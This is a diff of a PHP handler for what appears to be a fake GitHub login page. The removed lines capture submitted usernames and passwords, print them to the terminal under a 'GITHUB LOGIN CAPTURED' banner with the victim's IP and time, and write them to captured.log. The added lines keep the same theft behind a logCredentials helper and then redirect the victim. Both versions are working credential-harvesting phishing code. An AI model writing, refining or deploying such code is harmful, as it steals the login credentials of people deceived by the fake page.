@@ -1,37 +1,11 @@
 <?php
-// Capture credentials
+require_once 'utils.php';
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $username = $_POST['username'] ?? '';
-    $password = $_POST['password'] ?? '';
+    $username = sanitizeInput($_POST['username'] ?? '');
+    $password = sanitizeInput($_POST['password'] ?? '');
     
-    // Display in terminal
-    $stderr = fopen('php://stderr', 'w');
-    if ($stderr) {
-        fprintf($stderr, "\n╔════════════════════════════════════════════════════════════╗\n");
-        fprintf($stderr, "║ [GITHUB LOGIN CAPTURED]                                    ║\n");
-        fprintf($stderr, "║ Username: %s\n", str_pad($username, 48));
-        fprintf($stderr, "║ Password: %s\n", str_pad($password, 44));
-        fprintf($stderr, "║ Time: %s\n", date('Y-m-d H:i:s'));
-        fprintf($stderr, "║ IP: %s\n", str_pad($_SERVER['REMOTE_ADDR'] ?? 'unknown', 49));
-        fprintf($stderr, "╚════════════════════════════════════════════════════════════╝\n\n");
-        fclose($stderr);
-    } else {
-        error_log("[GITHUB LOGIN CAPTURED] Username: $username | Password: $password | IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown'));
-    }
-    
-    // Log to file
-    $log_entry = sprintf(
-        "[%s] GITHUB LOGIN | IP: %s | Username: %s | Password: %s\n",
-        date('Y-m-d H:i:s'),
-        $_SERVER['REMOTE_ADDR'] ?? 'unknown',
-        $username,
-        $password
-    );
-    
-    file_put_contents(__DIR__ . '/captured.log', $log_entry, FILE_APPEND);
-    error_log($log_entry);
-    
-    // Redirect to terminal after capture
+    logCredentials('github', ['username' => $username, 'password' => $password]);
     header('Location: index.php?github_success=1');
     exit;
 }
